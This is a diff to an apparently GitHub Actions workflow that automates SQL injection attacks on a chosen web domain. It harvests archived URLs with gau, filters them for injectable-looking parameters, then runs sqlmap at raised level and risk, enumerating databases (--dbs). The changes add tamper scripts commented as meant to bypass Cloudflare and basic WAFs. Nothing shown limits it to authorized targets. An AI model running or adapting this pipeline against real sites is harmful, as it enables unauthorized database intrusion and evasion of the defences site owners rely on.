@@ -9,7 +9,7 @@ on:
 jobs:
   sqli-scan:
     runs-on: ubuntu-latest
-    timeout-minutes: 120
+    timeout-minutes: 180
 
     steps:
 
@@ -30,7 +30,7 @@ jobs:
           echo "[*] Target domain: $DOMAIN"
 
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 3. Set up Go (required for gau)
+      # 3. Set up Go
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       - name: Set up Go
         uses: actions/setup-go@v5
@@ -38,72 +38,81 @@ jobs:
           go-version: '1.22'
 
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 4. Install gau
+      # 4. Install tools
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       - name: Install gau
         run: go install github.com/lc/gau/v2/cmd/gau@latest
 
-      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 5. Install uro (URL deduplicator)
-      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       - name: Install uro
         run: pip install uro --quiet
 
-      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 6. Install latest sqlmap from GitHub
-      #    (apt version is outdated and missing flags)
-      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       - name: Install sqlmap (latest from GitHub)
         run: |
           git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
-          sudo ln -sf ~/sqlmap/sqlmap.py /usr/local/bin/sqlmap
           chmod +x ~/sqlmap/sqlmap.py
-          sqlmap --version
+          python3 ~/sqlmap/sqlmap.py --version
 
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 7. Collect all URLs with gau
+      # 5. Collect all URLs with gau
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       - name: Collect URLs with gau
         run: |
           DOMAIN="${{ steps.target.outputs.domain }}"
           echo "[*] Running gau on: $DOMAIN"
-
           ~/go/bin/gau \
             --threads 5 \
             --retries 3 \
             --timeout 30 \
             --blacklist png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,eot,css,js,pdf,zip \
             "$DOMAIN" > all_urls.txt
-
           echo "[*] Total URLs collected: $(wc -l < all_urls.txt)"
 
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 8. Filter URLs with query parameters
+      # 6. Smart filter â€” remove junk params
+      #    Strips out: affiliate, tracking, redirect,
+      #    auth tokens, base64 blobs, UUID-only params
+      #    These are NEVER SQLi targets.
+      #    Keeps only real app params like id=, page=,
+      #    search=, category=, sort=, q=, etc.
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      - name: Filter parameterized URLs
+      - name: Smart filter parameterized URLs
         run: |
-          grep '?' all_urls.txt | grep '=' > param_urls_raw.txt || true
+          # Step 1: Keep only URLs with query parameters
+          grep '?' all_urls.txt | grep '=' | grep -v '\*' > step1.txt || true
 
-          # Remove wildcard URLs like /*?param=
-          grep -v '\*' param_urls_raw.txt > param_urls_clean.txt || true
+          # Step 2: Remove obvious tracking/affiliate/redirect params
+          # These patterns are marketing pixels, not DB queries
+          grep -vP '(\?|&)(open|cda_id|cda_arg|cda_params|redirect_data|auth_secret|castId|sub[0-9]+|click_id|device.id|cdn_cache|cfuvid|cf_bm|utm_|fbclid|gclid|msclkid|token|affiliate|aff_|ref_click|impression|campaign)=' step1.txt > step2.txt || true
 
-          # Deduplicate with uro
-          cat param_urls_clean.txt | uro > param_urls.txt || cp param_urls_clean.txt param_urls.txt
+          # Step 3: Remove URLs where ALL params look like base64/JWT/UUID
+          # (long random strings are tokens, not injectable values)
+          grep -v -P '=[A-Za-z0-9+/\-_]{40,}' step2.txt > step3.txt || cp step2.txt step3.txt
+
+          # Step 4: Deduplicate with uro
+          cat step3.txt | uro > param_urls.txt || cp step3.txt param_urls.txt
 
           COUNT=$(wc -l < param_urls.txt)
-          echo "[*] Parameterized URLs after dedup: $COUNT"
+          echo "[*] Quality parameterized URLs: $COUNT"
 
           if [ "$COUNT" -eq 0 ]; then
-            echo "[!] No parameterized URLs found. Exiting."
+            echo "[!] No quality injectable URLs found after filtering."
+            echo "[!] The target may only expose tracking/affiliate URLs publicly."
+            echo "[!] Consider authenticating and capturing URLs manually via Burp."
+            cat step1.txt | head -20
             exit 1
           fi
 
-          echo "[*] Sample URLs:"
-          head -10 param_urls.txt
+          echo "[*] Sample URLs for sqlmap:"
+          cat param_urls.txt
 
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 9. Run SQLMap
-      #    -m = read targets from file (correct flag)
+      # 7. Run SQLMap with WAF bypass tamper scripts
+      #    Tampers used:
+      #    - between        â†’ add comments between keywords
+      #    - randomcase     â†’ RaNdOmCaSe SQL keywords  
+      #    - space2comment  â†’ replace spaces with /**/
+      #    - charencode     â†’ URL-encode characters
+      #    Combined these help bypass Cloudflare/basic WAFs
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       - name: Run SQLMap
         run: |
@@ -115,16 +124,28 @@ jobs:
             --random-agent \
             --level=3 \
             --risk=2 \
-            --timeout=10 \
-            --retries=2 \
-            --threads=5 \
+            --timeout=15 \
+            --retries=3 \
+            --threads=3 \
+            --delay=1 \
+            --tamper=between,randomcase,space2comment,charencode \
+            --ignore-waf \
+            --skip-waf \
             --dbs \
             --output-dir=sqlmap_output \
             --smart \
+            --technique=BEUSTQ \
             2>&1 | tee sqlmap_output/sqlmap_full_log.txt
 
+          # Print summary
+          echo ""
+          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
+          echo "         SCAN SUMMARY"
+          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
+          grep -E "CRITICAL|injectable|identified" sqlmap_output/sqlmap_full_log.txt | grep -v WAF || echo "[*] No injections found."
+
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-      # 10. Upload results as artifact
+      # 8. Upload results
       # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       - name: Upload scan results
         if: always()
@@ -134,5 +155,6 @@ jobs:
           path: |
             sqlmap_output/
             param_urls.txt
+            step1.txt
             all_urls.txt
           retention-days: 14
